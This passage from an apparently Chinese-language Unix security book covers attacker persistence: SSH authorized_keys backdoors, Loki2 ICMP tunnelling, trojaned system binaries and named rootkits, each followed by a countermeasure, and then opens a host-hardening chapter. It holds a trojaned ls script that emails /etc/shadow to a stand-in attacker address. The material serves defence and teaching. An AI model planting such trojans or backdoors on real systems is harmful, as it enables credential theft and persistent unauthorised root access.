
# SSH 的 authorized_keys

如果受害主机正在运行 SSH 服务器，攻击者可能通过将他们的公钥放入 root 用户的 .ssh 目录中来维持对该主机的访问权限。SSH 会信任此公钥，并允许攻击者登录，前提条件是攻击者拥有相应的私钥。

## 滥用 SSH 的 Authorized_Keys 机制以确保持续的 root 访问权限

攻击者可以使用其主机上的 ssh-keygen 程序创建所需的公钥和私钥密钥对：

```bash
[bash]$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/intruder/.ssh/id_rsa):
Created directory '/home/intruder/.ssh'.
Enter passphrase (empty for no passphrase): [enter]
Enter same passphrase again: [enter]
Your identification has been saved in /home/intruder/.ssh/id_rsa.
Your public key has been saved in /home/intruder/.ssh/id_rsa.pub.
The key fingerprint is:
38:3c:7b:db:05:00:10:62:25:57:5c:b8:85:05:9a:a9 intruder@intruderoshost
```

现在，攻击者必须将 .ssh/id_rsa.pub 的内容复制到受害主机上的 .ssh/authorized_keys 文件中。完成此操作后，攻击者即可无需密码通过 SSH 登录受害主机：

```bash
[bash]$ ssh root@victim's_ip_address
Last login: Sun Mar 30 02:23:48 2003 from intruder's_host
[bash]#
```

## 禁止 root 通过 SSH 登录

不要允许 root 通过 SSH 登录。为了执行此规则，请编辑 sshd_config 并确保存在以下行：

`PermitRootLogin no`

## Loki2

Loki2 是一个免费提供的工具，常被攻击者用于安装后门。它使用 ICMP_ECHO 和 ICMP_REPLY 数据包来隧道传输 shell 命令。这使得它极难被检测到，因为其数据包看起来像是由 ping 工具生成的 ICMP 流量。

有关 Loki2 的更多信息，请访问 http://www.phrack.com/show.php?p=51&a=6。

## 收紧防火墙规则

配置防火墙以丢弃传入的 ICMP echo 请求和传出的 ICMP echo 回复。此外，除非必要，否则阻止所有传入和传出的 UDP 流量。

# 木马

黑客经常在受害主机上放置各种修改后的二进制命令文件。这些修改后的二进制文件看起来运行正常，但它们会暗中代表攻击者执行恶意命令。

## 将常用命令木马化

攻击者可能会用以下脚本替换 /bin/ls 二进制文件：

```bash
#!/bin/bash
cat /etc/shadow | mail intruder@intruders_email
/bin/ls.old
```

此脚本将 /etc/shadow 文件通过电子邮件发送给攻击者。当然，只有当 root 用户执行该脚本时才会成功。注意，该脚本调用了原始的 ls 二进制文件（保存为 /bin/ls.old）。这使得受害用户很难检测到它。这种修改后的二进制文件被称为木马。

以下是攻击者最常木马化的二进制文件：

- arp, cat, chfn, chsh, crontab, du, iconfig, finger, find, killall, more, locate, login, ls, lsof, passwd, pidof, ps, route, netstat, tail, tcpd, tcpspam, top, w, who, syslogd。

有关这些命令的许多描述，请参阅本书参考中心的“常用命令”部分。

## 检测木马

请参阅“检测 Rootkits”。

# ROOTKITS

为了收集并安装木马和后门，攻击者无需费太大周折。他们只需在网上搜索 rootkits 即可。Rootkits 是由现成的木马组成的软件包，旨在方便黑客使用。它们还包含其他工具，使攻击者能够自动清理日志文件、安装后门，并部署网络嗅探器等工具。以下几种黑产技术描述了几个免费在线上可获取的流行 rootkits。

## Adore

Adore rootkit 是一组 Linux 内核模块，可让攻击者隐藏进程、文件和网络设备详情。它还包括一个 root shell 后门。Adore 可从 http://www.team-teso.net/releases.php 获取。

## Linux Rootkit (LRK)

最受欢迎的 Linux rootkit 是 LRK，它包含许多常用命令的木马化二进制文件，包括但不限于：chfn, chsh, crontab, du, find, ifconfig, inetd, killall, login, ls, netstat, passwd, pidof, ps, rshd, syslogd, tcpd, top, sshd, 和 su。它还包含一个嗅探器以及 root shell 后门。LRK 可从 http://www.packetstormsecurity.org/ 获取。

## Tornkit

Tornkit 由各种木马二进制文件、嗅探工具以及执行自动禁用 syslogd 和其他关键服务的工具组成。它可以从 http://www.packetstormsecurity.org/ 下载。

## Knark

Knark 是一个隐藏文件和进程的 rootkit，还具有重定向命令的能力。它包含一个用于远程执行命令的后门。Knark 可从 http://www.packetstormsecurity.org/ 获取。

## 检测 Rootkits

以下工具可用于检测 rootkits 和木马：

- Chkrootkit 可用于检查系统中的 rootkits。它可从 http://www.chkrootkit.org/ 获取。
- 使用 Tripwire 或 Samhain 检测修改过的二进制文件。有关 Tripwire 的更多详情，请访问 http://www.tripwire.com/。有关 Samhain 的信息，请访问 http://samhain.sourceforge.net/。

## 摘要

从清理日志文件到安装后门和 rootkits，本章描述的许多技术列出了攻击者用于隐藏其存在并确保对受害主机持续 root 访问权限的各种方法。正如讨论的主题所显示，检测高级黑客的存在往往非常困难。因此，尽管本章结束了黑客方法论部分，但强烈建议您考虑本书第二部分的建议，以加强您的主机策略和配置。

# 第二部分

# 主机加固

第 7 章 默认设置和服务

第 8 章 用户和文件系统权限

第 9 章 日志记录和补丁管理

# 第 7 章

# 默认设置和服务

本章内容：

- 设置密码策略
- 删除或禁用不必要的账户
- 从 PATH 变量中移除“：”
- 检查 /etc/hosts.equiv 的内容
- 查找 .rhosts 文件
- 禁用 Suid 执行
- 使用 TCP Wrappers
- 加固 inetd 和 xinetd 配置
- 加固远程服务
- 摘要

大多数 Unix 和 Linux 发行版的默认安装为各种策略、应用和服务的更好加固留下了空间。本章提供了关于如何加固主机及其常用服务的提示。

## 设置密码策略

攻击者经常利用薄弱的密码策略来获取用户账户的访问权限。以下是加强密码策略可以采取的一些步骤：

- 确保正在使用影子密码（shadowed passwords）。检查 /etc/passwd 文件中是否存在密码哈希值。密码哈希值应仅存在于 /etc/shadow 文件中，并且此文件必须只能由 root 读取。
- 编辑 passwd 配置文件 (/etc/default/passwd) 或使用 chage 实用程序更改密码过期长度。

## 删除或禁用不必要的账户

检查 /etc/passwd 以查看主机上启用的账户。许多服务会创建非特权账户用于执行期间，例如：ftp, lp, news, gopher, ntp。确保通过将它们的 shell 设置为 /bin/false 来禁用此类账户。如果这些账户对应的服务未在使用，请卸载它们并删除账户。

## 从 PATH 变量中移除“.”

当用户执行命令时，命令 shell 会在包含于 PATH 环境变量中的目录列表中搜索命令的位置。为了防止执行由恶意用户放置在文件系统上的木马，请确保 PATH 环境变量绝不仅包含当前目录（“.”）。

检查诸如 /etc/rc.local, /etc/profile, /etc/bashrc, /etc/csh.cshrc, ~/.bashrc, ~/.bash_profile, ~/.cshrc, 和 ~/.login 等文件，确保 PATH 变量不包含“.”。如果您使用的 shell 不是 bash，请检查相应的资源文件。

使用 echo 打印当前用户的 PATH 变量的值：

```bash
echo $PATH
```

